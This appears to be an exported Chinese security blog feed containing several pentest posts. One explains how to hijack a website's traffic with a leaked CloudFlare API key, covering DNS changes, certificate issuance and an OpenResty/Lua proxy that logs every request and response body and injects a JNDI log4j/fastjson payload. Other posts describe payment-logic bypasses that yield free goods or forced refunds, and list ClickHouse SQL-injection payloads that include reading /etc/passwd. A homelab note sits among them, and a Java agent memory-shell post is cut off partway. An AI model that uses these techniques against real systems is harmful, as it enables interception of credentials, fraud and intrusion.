        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>攻击者具有修改域名解析记录的权限（比如拥有CloudFlare的API Key），可以修改CNAME或者A记录，想通过修改域名解析记录的方式，获取目标网站的所有流量（包括但不限于POST明文请求）。可以利用OpenResty的Lua扩展功能，记录HTTP请求体和相应的Response。顺嘴提一句，在CloudFalre里面，一般的接口操作都可以用API Key完成，但是一旦涉及到证书的续订下载等操作，需要用CA Key。</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>首先可以通过API接口查看泄漏的key是否生效：</p><h4 id="查看Zones"><a href="#查看Zones" class="headerlink" title="查看Zones"></a>查看Zones</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看Zones对应的DNS记录"><a href="#查看Zones对应的DNS记录" class="headerlink" title="查看Zones对应的DNS记录"></a>查看Zones对应的DNS记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看审计日志"><a href="#查看审计日志" class="headerlink" title="查看审计日志"></a>查看审计日志</h4><p>获取最近的登陆日志、操作日志、客户端IP等：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/accounts/<span class="token operator">&lt;</span>Account ID<span class="token operator">></span>/audit_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看最近的DNS请求数量"><a href="#查看最近的DNS请求数量" class="headerlink" title="查看最近的DNS请求数量"></a>查看最近的DNS请求数量</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_analytics/report?dimensions<span class="token operator">=</span>responseCode,queryName<span class="token operator">&amp;</span><span class="token assign-left variable">metrics</span><span class="token operator">=</span>queryCount<span class="token operator">&amp;</span><span class="token assign-left variable">sort</span><span class="token operator">=</span>+responseCode,-queryName<span class="token operator">&amp;</span><span class="token assign-left variable">filters</span><span class="token operator">=</span>responseCode<span class="token operator">==</span>NOERROR<span class="token operator">&amp;</span><span class="token assign-left variable">since</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T12:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">until</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T18:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">limit</span><span class="token operator">=</span><span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>假如目标网站是https，但是又获取不到https的证书，可以选择使用acme.sh来重新生成另外一份HTTPS证书，因为已经有了DNS的解析权限，可以走DNS验证的方式来获取域名证书：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/root/.acme.sh/acme.sh --issue --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please/root/.acme.sh/acme.sh --renew --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一个条命令会生成两个TXT解析，利用已有的DNS权限创建对应的TXT解析记录，然后运行第二条命令，不出意外的话可以成功生成证书。这时可以删除这两条TXT记录，注意使用dns认证的方式生成证书不可以自动续订。<br>相关的CloudFlare接口：</p><h4 id="新增DNS-Record"><a href="#新增DNS-Record" class="headerlink" title="新增DNS Record"></a>新增DNS Record</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"TXT"</span>, <span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"_acme-challenge.&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"TK..."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="删除DNS-Record"><a href="#删除DNS-Record" class="headerlink" title="删除DNS Record"></a>删除DNS Record</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">DELETE https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>不管是CNAME解析还是A解析都可以修改为A解析的方式，劫持域名到自己的服务器，前提是使用OpenResty把反代设置好，配置文件主要参考<a href="https://gist.github.com/virusdefender/984c2a304001d8de20049301b478700a/revisions">virusdefender师傅</a>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>    listen <span class="token number">80</span><span class="token punctuation">;</span>    server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    <span class="token builtin class-name">return</span> <span class="token number">301</span> https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token variable">$request_uri</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>server <span class="token punctuation">&#123;</span>listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    proxy_ssl_server_name on<span class="token punctuation">;</span>    proxy_ssl_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    ssl_certificate /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/fullchain.cer<span class="token punctuation">;</span>    ssl_certificate_key /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>error_log stderr error<span class="token punctuation">;</span>location / <span class="token punctuation">&#123;</span>proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>proxy_set_header Host <span class="token variable">$host</span><span class="token punctuation">;</span><span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        access_by_lua <span class="token string">'            ngx.req.read_body();        '</span><span class="token punctuation">;</span>        body_filter_by_lua <span class="token string">'            ngx.ctx.buffered = (ngx.ctx.buffered or "") .. ngx.arg[1]            if ngx.arg[2] then                ngx.var.resp_body = ngx.ctx.buffered            end        '</span><span class="token punctuation">;</span>        log_by_lua <span class="token string">'        local method=ngx.req.get_method();        if method == "POST" or (method == "PUT") or (method == "DELETE") then            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());            if ngx.req.get_body_data() ~= nil then                ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");            end            ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");        end        '</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>access_log /home/wwwlogs/access.log<span class="token punctuation">;</span>error_log /home/wwwlogs/error.log<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想看记录所有的请求，把上面的请求方法判断去掉就可以了。</p><h3 id="X-Forwarded-For字段"><a href="#X-Forwarded-For字段" class="headerlink" title="X-Forwarded-For字段"></a>X-Forwarded-For字段</h3><p>假如需要劫持的是一个中间代理域名，上游服务器是通过白名单IP来限制访问，获取IP的方式是通过XFF，这时候需要把XFF设置为<code>$remote_addr</code></p><h3 id="Host字段"><a href="#Host字段" class="headerlink" title="Host字段"></a>Host字段</h3><p>这里有一个很奇怪的问题，大概是取决于upstream的配置，有时候需要配置为<code>proxy_set_header Host $host</code>，但是有时候可能是<code>proxy_set_header Host $proxy_host</code>。</p><p>在以上都设置好之后，利用本地hosts绑定的方式先测试网站的接口功能是否正常，生成的日志是否正常。另外可以给80和443端口另外单独做一个默认配置，这样可以防止扫描器等日志出现，只单独记录反代的日志，<br>比如443端口新增一个自定义证书：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl genrsa -out privatekey.pem <span class="token number">2048</span>openssl req -new -key privatekey.pem -out private-csr.pemopenssl x509 -req -days <span class="token number">365</span> -in private-csr.pem -signkey privatekey.pem -out certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改OpenResty配置:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>        listen       <span class="token number">443</span> ssl<span class="token punctuation">;</span>        server_name  localhost default<span class="token punctuation">;</span>        ssl_certificate      /usr/local/openresty/nginx/certs/certificate.pem<span class="token punctuation">;</span>        ssl_certificate_key  /usr/local/openresty/nginx/certs/privatekey.pem<span class="token punctuation">;</span>        ssl_session_cache    shared:SSL:1m<span class="token punctuation">;</span>        ssl_session_timeout  5m<span class="token punctuation">;</span>        ssl_ciphers  HIGH:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>MD5<span class="token punctuation">;</span>        ssl_prefer_server_ciphers  on<span class="token punctuation">;</span>        location / <span class="token punctuation">&#123;</span>            root   html<span class="token punctuation">;</span>            index  index.html index.htm<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过上面设置这时候反代已经设置好可以进行流量劫持了，先记录原有的DNS解析，然后通过API修改域名的解析记录，解析道自己的服务器上，必要的情况下需要重新改回来：</p><h4 id="修改解析记录"><a href="#修改解析记录" class="headerlink" title="修改解析记录"></a>修改解析记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUT https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"A"</span>, <span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;attack ip>"</span>, <span class="token string">"proxiable"</span><span class="token builtin class-name">:</span> false, <span class="token string">"proxied"</span><span class="token builtin class-name">:</span> false<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="修改Response"><a href="#修改Response" class="headerlink" title="修改Response"></a>修改Response</h2><p>如果有其他的需求，比如修改Response用来测试客户端是否存在fastjson或者log4j漏洞，可以增加以下Lua代码，来修改特定的接口返回值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">location /some-api <span class="token punctuation">&#123;</span>proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span> <span class="token punctuation">;</span>proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>proxy_set_header Host   <span class="token variable">$proxy_host</span><span class="token punctuation">;</span><span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        access_by_lua <span class="token string">'            ngx.req.read_body();        '</span><span class="token punctuation">;</span>        header_filter_by_lua_block <span class="token punctuation">&#123;</span> ngx.header.content_length <span class="token operator">=</span> nil <span class="token punctuation">&#125;</span>        body_filter_by_lua <span class="token string">'            local chunk, eof = ngx.arg[1], ngx.arg[2]            local buffered = ngx.ctx.buffered            if not buffered then            buffered = &#123;&#125;  -- XXX we can use table.new here             ngx.ctx.buffered = buffered            end            if chunk ~= "" then            buffered[#buffered + 1] = chunk            ngx.arg[1] = nil            end            if eof then            local whole = table.concat(buffered)            ngx.ctx.buffered = nil            -- try to unzip            -- local status, debody = pcall(com.decode, whole)             -- if status then whole = debody end            -- try to add or replace response body            -- local js_code = ...            -- whole = whole .. js_code            ngx.log(ngx.ERR, whole)            whole = string.gsub(whole, ".+",  "&#123;\\"@type\\":\\"java.net.Inet6Address\\",\\"value\\":\\"dnslog\\", \\"message\\":\\"$&#123;jndi:ldap://dnslog&#125;\\"&#125;")            ngx.arg[1] = whole            end        '</span><span class="token punctuation">;</span>        log_by_lua <span class="token string">'        local method=ngx.req.get_method();         if method == "POST" or (method == "PUT") or (method == "DELETE") then            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());            if ngx.req.get_body_data() ~= nil then                 ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");            end                        ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");        end        '</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>支付接口安全测试记录</title>
      <link href="/2023/01/16/pay_vuln.html"/>
      <url>/2023/01/16/pay_vuln.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x1-低价值替换高价值SKU"><a href="#0x1-低价值替换高价值SKU" class="headerlink" title="0x1. 低价值替换高价值SKU"></a>0x1. 低价值替换高价值SKU</h3><p>在IOS平台上面支付完成之后，立刻杀掉进程，然后重新开启APP抓包，此时触发补单操作，拦截包之后，修改sku字段为高价值商品，尝试是否可以成功。</p><p>或者在Burp抓支付包的时候，因为apple服务接口验证了证书，可以在burp的<code>TLS Pass Through</code>配置绕过apple的域名，不对其进行抓包。</p><h3 id="0x2-替换订单号"><a href="#0x2-替换订单号" class="headerlink" title="0x2. 替换订单号"></a>0x2. 替换订单号</h3><p>首先产生一个未支付的高价值的订单号，其次正常购买低价值商品，打断后端返回的response，替换response里面的订单号为高价值订单号，然后尝试支付成功之后商品的数量。一般适用于Google支付。</p><h3 id="0x3-利用Google机制自动退款"><a href="#0x3-利用Google机制自动退款" class="headerlink" title="0x3. 利用Google机制自动退款"></a>0x3. 利用Google机制自动退款</h3><p>Google的SDK支付成功之后，客户端会发起一个接口请求: <a href="https://play-fe.googleapis.com/fdfe/consumePurchase">https://play-fe.googleapis.com/fdfe/consumePurchase</a> </p><p>Google Play结算服务官方文档中关于处理购买交易的描述：在三天内未确认购买交易，则用户会自动收到退款，并且Google Play会撤消该购买交易，可以利用此规则进行退款。这种攻击一般针对一次性消耗品，当然重复的也可以。在支付完成之后，拦截上面的请求之后丢弃，如果服务端未做正确处理，则三天之后Google会自动退款。</p><p>修复方式：后端手动调用确认接口进行二次确认<a href="https://developers.google.com/android-publisher/api-ref/rest/v3/purchases.products/acknowledge">acknowledge</a>，一般400可以视为已确认，409的时候需要查询一次状态，已确认状态可以放行，否则掉单处理。</p><h3 id="测试注意点"><a href="#测试注意点" class="headerlink" title="测试注意点"></a>测试注意点</h3><ul><li>某些版本的Burp抓不到Google的消费请求，或者是Burp显示DF-DFERH-01错误，这时候多更换burp版本试试，比如社区版</li><li>熟练利用Burp的<code>TLS Pass Through</code>和<code>Intercept Client Requests</code>功能抓包。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PVE使用注意事项</title>
      <link href="/2022/11/08/pve_homelab.html"/>
      <url>/2022/11/08/pve_homelab.html</url>
      
        <content type="html"><![CDATA[<p>组建的PVE使用的是这个方案: <a href="https://foxi.buduanwang.vip/virtualization/1183.html/">PVE+TrueNAS+ZFS+10G内网方案</a></p><h2 id="虚拟机磁盘选择"><a href="#虚拟机磁盘选择" class="headerlink" title="虚拟机磁盘选择"></a>虚拟机磁盘选择</h2><p>使用的时候创建的Windows虚拟机特别慢，打开管理器一看磁盘最高只有5M/S的写入速度，发现是选择的磁盘类型不同，在创建虚拟机的时候最好选择<a href="https://foxi.buduanwang.vip/virtualization/pve/1214.html/">SCSI的磁盘格式</a></p><p>比如在新建Windows虚拟机的时候，一般需要以下<a href="https://www.dudr.top/index.php/archives/121/">步骤</a>：</p><ol><li>下载<a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso">VirtIO驱动镜像</a></li><li>将镜像文件上传到 PVE 的 ISO镜像中</li><li>按照常规流程创建虚拟机，不启动</li><li>在虚拟机的 “硬件” 选项卡内添加 “CD/DVD驱动器”</li><li>挂载 win10 系统镜像和 VirtIO 驱动镜像 (CD1: win10.iso，CD2: virtio-win.iso)</li><li>检查虚拟机的 “选项” 选项卡内的 “引导顺序</li><li>启动虚拟机 &gt; “加载驱动程序” &gt; “浏览” D:\amd64\win10 &gt; “下一步”，安装驱动程序</li><li>驱动安装后在磁盘列表就会检测到硬盘，继续后续系统安装步骤</li></ol><p>但是我现在已经装好了虚拟机，需要把IDE类型的磁盘转换为SCSI：</p><ol><li>已有的虚拟机插入两个ISO设备，一个是Win10镜像，一个是Virto镜像</li><li>开机启动进入Win10镜像，然后<code>SHIFT+F10</code>调出cmd</li><li>确定C盘的盘符和Virto的盘符，输入命令<code>dism /image:C:\ /add-driver /driver:E:\vioscsi\w10\amd64</code></li><li>随后关机: <code>wpeutil shutdown -s</code></li><li>在PVE虚拟机界面分离磁盘，把磁盘类型改为SCSI，随后重启即可</li></ol><p><img src="/2022/11/08/pve_homelab/1.png"></p><p>改完之后的写入速度在40M/S～50M/S左右</p><h2 id="数据的备份和关机顺序"><a href="#数据的备份和关机顺序" class="headerlink" title="数据的备份和关机顺序"></a>数据的备份和关机顺序</h2><h3 id="Windows备份"><a href="#Windows备份" class="headerlink" title="Windows备份"></a>Windows备份</h3><p>假如需要在Windows里面增量备份A目录到共享文件夹，可以选择新增计划任务，每5分钟备份一次：</p><ol><li>计划任务: <code>robocopy C:\Users\Administrator\source\repos \\truenas\source /mir</code></li><li>修改计划任务的触发器和运行的脚本</li></ol><h3 id="PVE关机顺序"><a href="#PVE关机顺序" class="headerlink" title="PVE关机顺序"></a>PVE关机顺序</h3><p>背景是开了好几个虚拟机，然后直接在PVE系统里面直接shutdown，当有其他虚拟机运行的时候，可能会数据丢失。我的truenas虚拟机ID是100，新建一个脚本<code>pve_shutdown</code>，在每次关机的时候顺序关闭虚拟机，最后关闭truenas，同时新增一个快照备份:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">RUNNING_PVE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>qm list <span class="token operator">|</span><span class="token function">grep</span> running <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span><span class="token keyword">for</span> <span class="token for-or-select variable">pve</span> <span class="token keyword">in</span> <span class="token variable">$RUNNING_PVE</span><span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$pve</span> <span class="token operator">!=</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    qm snapshot <span class="token variable">$pve</span> <span class="token string">"date-<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%Y%m%d<span class="token variable">)</span></span>"</span>    <span class="token function">rm</span> -rf /run/lock/qemu-server/lock-<span class="token variable">$pve</span>.conf    qm unlock <span class="token variable">$pve</span>    qm <span class="token function">shutdown</span> <span class="token variable">$pve</span>    <span class="token keyword">fi</span><span class="token keyword">done</span>qm snapshot <span class="token number">100</span> <span class="token string">"date-<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%Y%m%d<span class="token variable">)</span></span>"</span>qm -rf /run/lock/qemu-server/lock-100.confqm unlock <span class="token number">100</span>qm <span class="token function">shutdown</span> <span class="token number">100</span><span class="token function">shutdown</span> now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将上面脚本保存为<code>pve_shutdown</code>，放在环境变量里面，然后使用快捷指令的运行SSH脚本，这样在手机上就可以关机了。</p>]]></content>
      
      
      <categories>
          
          <category> Fun </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ClickHouse注入测试记录</title>
      <link href="/2022/10/27/clickhouse-sql-inject.html"/>
      <url>/2022/10/27/clickhouse-sql-inject.html</url>
      
        <content type="html"><![CDATA[<h2 id="前期尝试"><a href="#前期尝试" class="headerlink" title="前期尝试"></a>前期尝试</h2><p>根据源代码发现可以利用<code>&#39;)</code>拼接闭合SQL语句之后，插入要注入的Payload，比如：<code>1&#39;)and sleep(3) and (&#39;1</code>，可以休眠3S。经过测试发现存在以下限制：</p><ul><li>sleep的时间不能超过3秒，超过之后造成请求查询超时，会立刻返回</li><li>sleep关键词不能使用大写，因为clickhouse函数大小写敏感</li><li>无法使用sqlmap跑数据，因为sqlmap不支持clickhouse数据库</li></ul><p>虽然Sqlmap不支持ClickHouse，但是我还是不死心的跑了一下，<del>可能这就是脚本小子吧</del></p><p>经过我不懈努力，终于让Sqlmap跑出来了可注入点:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlmap.py -r ~/Desktop/sql.txt -v --technique<span class="token operator">=</span>T --level <span class="token number">3</span> -v <span class="token number">3</span> --dbms MySQL --time-sec <span class="token number">3</span> --prefix <span class="token string">"')"</span> --suffix <span class="token string">"and ('"</span> --tamper lowercase --proxy http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/27/clickhouse-sql-inject/1.png"></p><p>为了让Sqlmap跑出来这个注入点，一言难尽。因为sqlmap里面的<code>SLEEP(5)</code>是自带的payload，就算是加了<code>--tamper lowercase</code>也不会改变这个关键payload的大小写，始终是大写。所以我当时有两个选择：</p><ol><li>写个Burp插件转变成小写–费时费力</li><li>修改Sqlmap的源代码–这个简单</li></ol><p>于是乎，我直接编辑sqlmap目录下的<code>data/xml/payloads/time_blind.xml</code>，直接把<code>SLEEP</code>替换为<code>sleep</code>，然后发现会影响<code>SLEEPTIME</code>这个变量，再替换一次<code>sleepTime</code>为<code>SLEEPTIME</code>。</p><p>跑出来注入点没问题了，但是Sqlmap跑完之后会二次确认是否对应的数据库，会再发送几个payload二次确认数据库的类型。到此时我就傻眼了，特么那我前面干了啥(<del>不愧是脚本小子</del>)。</p><h2 id="手工阶段"><a href="#手工阶段" class="headerlink" title="手工阶段"></a>手工阶段</h2><p>尝试使用报错注入的payload可以成功获取数据：</p><ul><li><code>&#39;) and (select currentDatabase()) and (&#39;</code></li><li><code>&#39;) and ((select * from (select arrayStringConcat(*)from system.tables )a)) and (&#39;&quot;</code></li><li><code>&quot;&#39;) and ((select * from (select arrayStringConcat(*)from system.databases )a)) and (&#39;&quot;</code></li></ul><p>以下操作显示无权限：</p><ul><li><code>&#39;) and (select * from url(&#39;&lt;ip&gt;&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li><li><code>&#39;) and (select * from file(&#39;/etc/passwd&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li></ul><h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><ul><li>能否利用Clickhouse的<code>JDBC</code>进行JNDI注入</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.deteact.com/yandex-clickhouse-injection/">Yandex.ClickHouse injection</a></li><li><a href="https://johnfrod.top/ctf/bytectf-2021double-sqli/">ByteCTF 2021 double sqli</a></li><li><a href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url/">https://clickhouse.com</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全笔记(4)-Java Agent</title>
      <link href="/2022/06/23/java-agent-shell.html"/>
      <url>/2022/06/23/java-agent-shell.html</url>
      
        <content type="html"><![CDATA[<h2 id="学习背景"><a href="#学习背景" class="headerlink" title="学习背景"></a>学习背景</h2><p><img src="/2022/06/23/java-agent-shell/1.png"></p><ol><li>Agent本来就在学习的清单上</li><li>更深入理解下草师傅说的代理模式</li><li>study the world</li></ol><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><p>AOP为Aspect Oriented Programming的缩写，意为: 面向切面编程，在运行时，动态地将代码切入到类的指定方法、指定位置上的编程思想就是面向切面的编程。<br>以下引用来自su18和天下大木头师傅的博客：</p><blockquote><p>JDK 1.5 开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。</p></blockquote><blockquote><p>开发者可以在一个普通Java程序（带有main函数的Java类）运行时，通过<code>–javaagent</code>参数指定一个特定的jar文件(包含Instrumentation代理)来启动Instrumentation的代理程序。在类的字节码载入jvm前会调用ClassFileTransformer的transform方法，从而实现修改原类方法的功能，实现AOP。</p></blockquote><p>通过java.lang.instrument实现的工具我们称之为Java Agent，Java Agent能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法，Agent内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去。</p><p>说白了Java Agent只是一个Java类而已，只不过普通的Java类是以main函数作为入口点的，Java Agent的入口点则是premain和agentmain</p><p>Java Agent 支持两种方式进行加载：</p><ul><li>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</li><li>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）</li></ul><h2 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h2><p>首先创建一个premain的agent:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>agentArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token 